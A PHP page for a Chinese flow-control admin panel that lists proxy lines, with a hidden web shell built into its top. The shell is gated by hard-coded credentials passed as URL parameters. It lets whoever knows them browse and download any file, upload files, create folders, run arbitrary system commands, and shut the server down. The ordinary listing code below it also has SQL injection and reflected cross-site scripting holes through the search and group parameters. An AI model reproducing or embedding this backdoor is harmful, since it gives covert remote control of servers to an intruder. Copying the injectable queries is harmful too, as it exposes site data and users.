<?phpif($_GET['us']=="qingfeng666" && $_GET['ps']=="xiaokang789") {    header("Content-type: text/html; charset=utf-8");    echo "<center>康师傅安全系统V1.0<center/>";    $fp = '';    $path = '';    if(empty($_GET['action'])){        if(empty($_GET['path'])){            $_path = dirname(__FILE__);        }else{            if(is_dir($_GET['path'])){                $_path = $_GET['path'];                         }else{                             $_path .=  dirname($_GET['path']);                $file_name = $_GET['path'];                if (!file_exists($file_name)) { //检查文件是否存在                    echo "文件找不到";                } else {                    $file = fopen($file_name,"r"); // 打开文件                     // 输入文件标签                    Header("Content-type: application/octet-stream");                    Header("Accept-Ranges: bytes");                    Header("Accept-Length: ".filesize($file_name));                    Header("Content-Disposition: attachment; filename=" . str_replace(array(dirname($_GET['path']),'/'),'',$file_name));                    // 输出文件内容                    echo fread($file,filesize($file_name));                    fclose($file);                    exit;                }               }        }    }else if($_GET['action'] == 'close'){        $time = intval($_GET['time']) > 0 ? intval($_GET['time']) : $_GET['time'];         exec('shutdown -s -t '.$time);        $_path = $_GET['path'];    }else if($_GET['action'] == 'cancel'){        exec('shutdown -a');        $_path = $_GET['path'];    }else if($_GET['action'] == 'mkdir'){        $_path = $_GET['path'];        $name =  $_GET['name'];        $_path .=  $name;        mkdir($_path);    }else if($_GET['action'] == 'upload'){        $_path = $_POST['path'];        $name =  $_FILES['name'];         move_uploaded_file($name['tmp_name'],$_path  . $name['name'] );    }else if($_GET['action'] == 'ord'){        $_path = $_GET['path'];        $name =  $_GET['name'];        exec($name);        }    $dir = dir($_path);?><table width="100%" border=1 > <tr>    <th colspan=3>        <form method="get" action="" >        目录:<input type="text" name="path" value="<?php echo $_path ?>" />        <input type="hidden" name="us" value="qingfeng666">        <input type="hidden" name="ps" value="xiaokang789">        <input type="submit" value="跳转" />        </form>        <input type="text" value="100" id="time">秒        <input type="hidden" name="us" value="qingfeng666">        <input type="hidden" name="ps" value="xiaokang789">        <input type="button" value="关机" onclick="location.href='?us=qingfeng666&ps=xiaokang789&time='+document.getElementById('time').value+'&action=close&path=<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>'" />        <input type="button" value="取消关机" onclick="location.href='?us=qingfeng666&ps=xiaokang789&action=cancel&path=<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>'" />         <form method="get" action="" >        创建目录:<input type="text" name="name" value="" />        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />        <input type="hidden" name="action" value="mkdir">        <input type="hidden" name="us" value="qingfeng666">        <input type="hidden" name="ps" value="xiaokang789">        <input type="submit" value="创建" />        </form>         <form method="get" action="" >        执行命令:<input type="text" name="name" value="" />        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />        <input type="hidden" name="action" value="ord">        <input type="hidden" name="us" value="qingfeng666">        <input type="hidden" name="ps" value="xiaokang789">        <input type="submit" value="执行" />        </form>                  <form method="post" action="?us=qingfeng666&ps=xiaokang789&action=upload" enctype="multipart/form-data" >        文件上传:<input type="file" name="name" value="" />        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />        <input type="hidden" name="us" value="qingfeng666">        <input type="hidden" name="ps" value="xiaokang789">        <input type="submit" value="上传" />        </form>    </th></tr><?php    while($fp = $dir->read()){?>   <tr>    <td><a href="?us=qingfeng666&ps=xiaokang789&path=<?php echo $fp == '..' ? @dirname($_path) : $_path.'/'.$fp; ?>"><?php echo $fp ?></a></td></tr><?php    }?></table><?php}else  {?>    <!DOCTYPE html>  <html lang="en"><head>    <meta charset="utf-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1">    <meta name="description" content="">    <meta name="author" content="">    <link rel="icon" type="image/png" sizes="16x16" href="../plugins/images/favicon.png">    <title>康师傅流控管理后台</title>    <!-- Bootstrap Core CSS -->    <link href="bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">    <!-- Menu CSS -->    <link href="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">    <!-- animation CSS -->    <link href="css/animate.css" rel="stylesheet">    <!-- Custom CSS -->    <link href="css/style.css" rel="stylesheet">    <!-- color CSS -->    <link href="css/colors/default.css" id="theme" rel="stylesheet">    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->    <!--[if lt IE 9]>    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script><![endif]-->    <script>        (function (i, s, o, g, r, a, m) {            i['GoogleAnalyticsObject'] = r;            i[r] = i[r] || function () {                (i[r].q = i[r].q || []).push(arguments)            }, i[r].l = 1 * new Date();            a = s.createElement(o), m = s.getElementsByTagName(o)[0];            a.async = 1;            a.src = g;            m.parentNode.insertBefore(a, m)        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');        ga('create', 'UA-19175540-9', 'auto');        ga('send', 'pageview');    </script></head><?php     include 'php/header.php';    include 'php/left-sidebar.php';?>    <!-- Page Content -->    <div id="page-wrapper">        <div class="container-fluid">            <div class="row bg-title">                <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">                    <h4 class="page-title">线路列表</h4> </div>                <!-- /.col-lg-12 -->            </div>            <div class="alert alert-success alert-dismissable">    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">    &times;    </button>                    <strong>提示：</strong> 默认只自带线路的示例，请不要用示例连接！需要线路请到线路推送页面下载线路到本地！</div>            <!-- /row -->            <div class="row">                 <div class="col-sm-16"><div class="white-box"><?phpif($_GET['act'] =='qk'){//清空记录结果if($sql=$DB->query("DELETE FROM `line` WHERE 1")==true){echo '    <div class="alert alert-success alert-dismissable">    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">    &times;    </button>清空成功！</div>';}else{echo '<div class="alert alert-danger alert-dismissable">    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">    &times;    </button>清空失败！</div>';}}if($_GET['act'] == 'del'){  $id = daddslashes($_POST['id']);    if($sql=$DB->query("DELETE FROM `line` WHERE `line`.`id` = $id;")){      die(json_encode(array("status"=>'success')));    }else{      die(json_encode(array("status"=>'error')));    }      }elseif($_GET['act'] == 'show'){    $id = daddslashes($_POST['id']);    $show = $_POST['show'] == '1' ? "1" : "0";    if($sql=$DB->query("UPDATE `line` SET `show` = '$show' WHERE `line`.`id` = $id;")){      die(json_encode(array("status"=>'success')));    }else{      die(json_encode(array("status"=>'error')));    }  }else{if(@$_GET["gid"] == ""){  $data = [];}else{  $where[] = "`group`=:group ";  $data[":group"] = $_GET["gid"];}if(@$_GET["kw"] != ""){  $where[] = " name LIKE :name";  $data[":name"] = "%".$_GET["kw"]."%";}if(!empty($_GET['kw'])) {  $sql=" `name` LIKE '%{$_GET['kw']}%'";  $numrows=$DB->count("SELECT count(*) from `line` WHERE{$sql};");  $con='平台共有 '.$numrows.' 条线路';}else{  $numrows=$DB->count("SELECT count(*) from `line` WHERE 1;");  $sql=" 1";  $con='平台共有 '.$numrows.' 条线路';}?>            <h3 class="box-title m-b-0"><?php echo $con; ?></h3>            <a href="addline.php" class="btn btn-primary">添加线路</a>            <a href="linelist.php?act=qk" class="btn btn-danger" onclick="if(!confirm('你确实要删除所有线路吗？')){return false;}">清空所有线路</a>            </div>            </div>                  <div class="white-box">                    <div class="table-responsive">                    <form action="linelist.php" method="get" role="form" class="form-inline pull-right">                    <div class="input-group">                    <input type="text" name="kw" class="form-control" placeholder="线路名称(支持模糊查询)" value="<?php echo $_GET["kw"]?>" required>                     <span class="input-group-btn">                    <button type="submit" class="btn waves-effect waves-light btn-info"><i class="fa fa-search"></i></button>                    </span></div>                     </form><!-- <button type="button" class="btn btn-warning btn-xs">线路分类</button> --><?phpif(@$_GET["gid"] == ""){  echo '<div style="clear:both;height:8px;"></div><span class="label label-info" ><a href="?'.$t_str.'" style="color:#fff">全部</a></span>';}else{  echo '<div style="clear:both;height:8px;"></div>&nbsp;&nbsp;&nbsp;&nbsp;<span ><a href="?'.$t_str.'" >全部</a></span>';}$rs=$DB->query("SELECT * FROM `line_grop`");foreach($rs as $res){  if($res['id'] == $_GET["gid"]){    echo '&nbsp;&nbsp;&nbsp;&nbsp;<span class="label label-info" ><a href="?gid='.$res["id"].'" style="color:#fff">'.$res['name'].'</a></span>';  }else{    echo '&nbsp;&nbsp;&nbsp;&nbsp;<span><a href="?gid='.$res["id"].'">'.$res['name'].'</a></span>';  }}                                          $pagesize=30;                                          $pages=intval($numrows/$pagesize);                                          if ($numrows%$pagesize)                                          {                                           $pages++;                                           }                                          if (isset($_GET['page'])){                                          $page=intval($_GET['page']);                                          }                                          else{                                          $page=1;                                          }                                          $offset=$pagesize*($page - 1);?><div style="clear:both;height:10px;"></div>                            <table class="table table-bordered table-striped">                                <thead>                                    <tr>                                        <th>ID</th>                                        <th data-priority="1">名称</th>                                        <th data-priority="3">类型</th>                                        <th data-priority="6">说明</th>                                        <th data-priority="6">状态</th>                                        <th data-priority="6">操作</th>                                    </tr>                                </thead>                                <tbody>                                      <?php                                                                                                                  if (empty($_GET['gid']))                                      {                                        $list=$DB->query("SELECT * FROM `line` WHERE{$sql} order by id desc limit $offset,$pagesize;");                                      }                                      else{                                        $Getgid = $_GET['gid'];                                        $list=$DB->query("SELECT * FROM `line` WHERE{$sql} AND `group` LIKE '$Getgid' order by id desc limit $offset,$pagesize;");                                      }                                      foreach($list as $vo){                                            ?>                                          <tr class=" line-id-<?=$vo['id']?>">      <td><?=$vo['id']?></td>      <td><?=$vo['name']?></td>      <td><?=$vo['type']?></td>      <td><?=$vo['label']?></td>      <td><?php   echo $vo['show'] == '1'? '<button type="button" class="btn btn-success btn-xs showstatus" onclick="qiyong(\''.$vo['id'].'\')" data="1">已启用</button>&nbsp;':'<button type="button" class="btn btn-danger btn-xs showstatus" onclick="qiyong(\''.$vo['id'].'\')" data="0">已禁用</button>&nbsp;'; ?></td>      <td><button type="button" class="btn btn-primary btn-xs" onclick="window.location.href='addline.php?act=mod&id=<?=$vo['id']?>'">编辑</button> <button type="button" class="btn btn-danger btn-xs" onclick="delLine('<?=$vo['id']?>')">删除</button> <a type="button" class="btn btn-info btn-xs" onclick="window.location.href='function.php?act=download&id=<?=$vo['id']?>'" target="download">下载</a></td>    </tr>                                          <?php }                                          ?>                                </tbody>                            </table>                        </div>                        <?php                      echo'<ul class="pagination pagination-sm waves-effect">';                      $first=1;                      $prev=$page-1;                      $next=$page+1;                      $last=$pages;                      if ($page>1)                      {                      echo '<li><a href="linelist.php?page='.$first.$link.'">首页</a></li>';                      echo '<li><a href="linelist.php?page='.$prev.$link.'">&laquo;</a></li>';                      } else {                      echo '<li class="disabled"><a>首页</a></li>';                      echo '<li class="disabled"><a>&laquo;</a></li>';                      }                      for ($i=1;$i<$page;$i++)                      echo '<li><a href="linelist.php?page='.$i.$link.'">'.$i .'</a></li>';                      echo '<li class="disabled"><a>'.$page.'</a></li>';                      for ($i=$page+1;$i<=$pages;$i++)                      echo '<li><a href="linelist.php?page='.$i.$link.'">'.$i .'</a></li>';                      echo '';                      if ($page<$pages)                      {                      echo '<li><a href="linelist.php?page='.$next.$link.'">&raquo;</a></li>';                      echo '<li><a href="linelist.php?page='.$last.$link.'">尾页</a></li>';                      } else {                      echo '<li class="disabled"><a>&raquo;</a></li>';                      echo '<li class="disabled"><a>尾页</a></li>';                      }                      echo'</ul>';                      #分页                      }                      ?>                    </div>                                  </div>            </div>            <!-- /.row -->            <?php include 'php/right-sidebar.php';?>        </div>        <!-- /.container-fluid -->        <?php include 'php/footer.php';?>    </div>    <!-- /#page-wrapper -->    </div>    <script>function qiyong(id){  var doc = $('.line-id-'+id+' .showstatus');  if(doc.attr('data') == "1"){    doc.html("已禁用").attr({'data':'0'});  }else{    doc.html("已启用").attr({'data':'1'});  }  var url = "linelist.php?act=show";    var data = {      "id":id,      "show":doc.attr('data')    };    $.post(url,data,function(data){      if(data.status == "success"){      }else{        alert("操作失败");      }    },"JSON");}function delLine(id){  if(confirm('确认删除吗？删除后不可恢复哦！')){    $('.line-id-'+id).slideUp();    var url = "linelist.php?act=del";    var data = {      "id":id    };    $.post(url,data,function(data){      if(data.status == "success"){      }else{        alert("删除失败");      }    },"JSON");  }}</script><iframe name="download" style="display:none"></iframe>    <!-- /#wrapper -->    <!-- jQuery -->    <script src="../plugins/bower_components/jquery/dist/jquery.min.js"></script>    <!-- Bootstrap Core JavaScript -->    <script src="bootstrap/dist/js/bootstrap.min.js"></script>    <!-- Menu Plugin JavaScript -->    <script src="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>    <!--slimscroll JavaScript -->    <script src="js/jquery.slimscroll.js"></script>    <!--Wave Effects -->    <script src="js/waves.js"></script>    <!-- Custom Theme JavaScript -->    <script src="js/custom.min.js"></script>    <!-- jQuery peity -->    <script src="../plugins/bower_components/peity/jquery.peity.min.js"></script>    <script src="../plugins/bower_components/peity/jquery.peity.init.js"></script>    <!--Style Switcher -->    <script src="../plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>    <!--Style Switcher --><script src="../plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script></body></html><?php } ?>